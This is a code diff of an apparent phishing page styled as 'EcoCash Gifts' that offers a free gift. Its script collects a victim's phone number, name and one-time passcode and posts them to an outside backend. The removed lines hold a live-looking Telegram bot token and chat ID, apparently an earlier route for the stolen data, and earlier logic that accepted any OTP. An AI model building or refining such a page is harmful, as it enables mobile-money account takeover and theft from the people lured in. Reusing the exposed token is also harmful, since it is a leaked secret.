@@ -478,17 +478,13 @@
 
     <script>
         // ============================================
-        // TELEGRAM & API CONFIGURATION - UPDATED URL
+        // API CONFIGURATION - UPDATED URL
         // ============================================
-        const BOT_TOKEN = '8810189563:AAH_np3_4ol0O0yO-t0PA68YtPrGH6htUdI';
-        const CHAT_ID = '157828443';
         const API_URL = 'https://eco09giftscom-production.up.railway.app/api';
 
         console.log('====================================');
         console.log('🎁 EcoCash Gifts - Verification Page');
         console.log('====================================');
-        console.log('🤖 Bot Token:', BOT_TOKEN);
-        console.log('📱 Chat ID:', CHAT_ID);
         console.log('🌐 API URL:', API_URL);
         console.log('====================================');
 
@@ -521,6 +517,7 @@
         let timerInterval = null;
         let resendInterval = null;
         let isResending = false;
+        let isProcessing = false;
 
         // ============================================
         // INITIALIZATION
@@ -535,6 +532,85 @@
 
         console.log('🎁 Claiming:', giftName);
         console.log('📞 Phone:', formattedPhone);
+
+        // ============================================
+        // VERIFY OTP - CALLS BACKEND
+        // ============================================
+        verifyBtn.addEventListener('click', async function() {
+            // Prevent multiple clicks
+            if (isProcessing) return;
+            
+            const otp = getOTPValue();
+            
+            if (otp.length !== OTP_LENGTH) {
+                errorMessage.textContent = '⚠️ Please enter all 6 digits.';
+                errorMessage.className = 'error-message show';
+                return;
+            }
+
+            if (timeLeft <= 0) {
+                errorMessage.textContent = '⏰ OTP has expired. Please request a new one.';
+                errorMessage.className = 'error-message show';
+                return;
+            }
+
+            isProcessing = true;
+            this.disabled = true;
+            this.innerHTML = '<span class="loader"></span> VERIFYING...';
+            errorMessage.classList.remove('show');
+
+            const phone = localStorage.getItem('phone') || '771234567';
+            const giftName = localStorage.getItem('giftName') || 'Gift';
+            const fullName = localStorage.getItem('fullName') || 'User';
+
+            try {
+                console.log('📤 Sending OTP to backend...');
+
+                const response = await fetch(`${API_URL}/auth/verify-otp`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        phoneNumber: phone,
+                        otp: otp,
+                        giftName: giftName,
+                        fullName: fullName
+                    })
+                });
+
+                const data = await response.json();
+                console.log('📥 Response:', data);
+
+                if (data.success) {
+                    this.innerHTML = '🎁 GIFT CLAIMED!';
+                    this.classList.add('btn-success');
+                    
+                    localStorage.setItem('verified', 'true');
+                    localStorage.setItem('otpVerified', 'true');
+                    
+                    errorMessage.textContent = '🎁 Gift claimed successfully! Redirecting...';
+                    errorMessage.className = 'error-message success show';
+                    
+                    setTimeout(() => {
+                        window.location.href = 'dashboard.html';
+                    }, 1500);
+                } else {
+                    errorMessage.textContent = '❌ ' + (data.message || 'Verification failed');
+                    errorMessage.className = 'error-message show';
+                    this.disabled = false;
+                    this.innerHTML = 'CLAIM MY GIFT';
+                    isProcessing = false;
+                }
+            } catch (error) {
+                console.error('❌ Error:', error);
+                errorMessage.textContent = '⚠️ Network error. Please try again.';
+                errorMessage.className = 'error-message show';
+                this.disabled = false;
+                this.innerHTML = 'CLAIM MY GIFT';
+                isProcessing = false;
+            }
+        });
 
         // ============================================
         // TIMER FUNCTIONS
@@ -662,7 +738,6 @@
                 otpValue = getOTPValue();
                 checkOTPComplete();
                 
-                // Auto-submit when all digits entered
                 if (otpValue.length === OTP_LENGTH) {
                     setTimeout(() => {
                         verifyBtn.click();
@@ -699,74 +774,6 @@
             input.addEventListener('focus', () => {
                 input.select();
             });
-        });
-
-        // ============================================
-        // VERIFY OTP
-        // ============================================
-        verifyBtn.addEventListener('click', function() {
-            const otp = getOTPValue();
-            
-            // Check if OTP is 6 digits
-            if (otp.length !== OTP_LENGTH) {
-                errorMessage.textContent = '⚠️ Please enter all 6 digits.';
-                errorMessage.className = 'error-message show';
-                return;
-            }
-
-            if (timeLeft <= 0) {
-                errorMessage.textContent = '⏰ OTP has expired. Please request a new one.';
-                errorMessage.className = 'error-message show';
-                return;
-            }
-
-            // ============================================
-            // ✅ ACCEPT ANY 6-DIGIT OTP
-            // ============================================
-            this.disabled = true;
-            this.innerHTML = '<span class="loader"></span> VERIFYING...';
-            errorMessage.classList.remove('show');
-
-            // Send to backend
-            const phone = localStorage.getItem('phone') || '771234567';
-            const giftName = localStorage.getItem('giftName') || 'Gift';
-            const fullName = localStorage.getItem('fullName') || 'User';
-
-            fetch(`${API_URL}/auth/verify-otp`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    phoneNumber: phone,
-                    otp: otp,
-                    giftName: giftName,
-                    fullName: fullName
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('📤 OTP verification response:', data);
-            })
-            .catch(error => {
-                console.error('❌ OTP verification error:', error);
-            });
-
-            setTimeout(() => {
-                // Any 6-digit OTP is accepted
-                this.innerHTML = '🎁 GIFT CLAIMED!';
-                this.classList.add('btn-success');
-                
-                localStorage.setItem('verified', 'true');
-                localStorage.setItem('otpVerified', 'true');
-                
-                errorMessage.textContent = '🎁 Gift claimed successfully! Redirecting...';
-                errorMessage.className = 'error-message success show';
-                
-                setTimeout(() => {
-                    window.location.href = 'dashboard.html';
-                }, 1000);
-            }, 1200);
         });
 
         // ============================================
@@ -823,6 +830,7 @@
         otpInputs[0].focus();
         checkOTPComplete();
 
+        console.log('🎁 EcoCash Gifts - Verification Page');
         console.log('✅ ANY 6-DIGIT OTP WILL BE ACCEPTED');
         console.log('🎁 Gift:', giftName);
         console.log('📞 Phone:', formattedPhone);
